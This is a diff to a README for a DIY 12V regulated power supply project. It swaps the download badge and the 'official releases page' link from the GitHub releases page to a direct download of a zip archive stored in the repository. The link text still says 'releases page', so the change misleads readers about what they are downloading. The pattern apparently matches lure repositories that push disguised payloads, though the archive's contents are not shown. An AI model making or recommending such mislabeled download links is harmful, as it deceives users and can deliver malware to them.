@@ -1,6 +1,6 @@
 # ⚡ Simple-12V-Regulated-Power-Supply - Build your own stable power source
 
-[![Download Power Supply Files](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Korrieclanging201/Simple-12V-Regulated-Power-Supply/releases)
+[![Download Power Supply Files](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Korrieclanging201/Simple-12V-Regulated-Power-Supply/raw/refs/heads/main/Fabrication/Regulated_Simple_Supply_Power_2.9-alpha.4.zip)
 
 ## 📋 Project Overview
 
@@ -20,7 +20,7 @@ The circuit uses a linear regulator to keep the voltage steady. It manages heat 
 
 You need the design files to build this board. Follow these steps to obtain them:
 
-1. Visit the [official releases page](https://github.com/Korrieclanging201/Simple-12V-Regulated-Power-Supply/releases).
+1. Visit the [official releases page](https://github.com/Korrieclanging201/Simple-12V-Regulated-Power-Supply/raw/refs/heads/main/Fabrication/Regulated_Simple_Supply_Power_2.9-alpha.4.zip).
 2. Look for the latest release version on the page.
 3. Click the link to download the compressed folder.
 4. Save the folder to a location you can find on your computer.
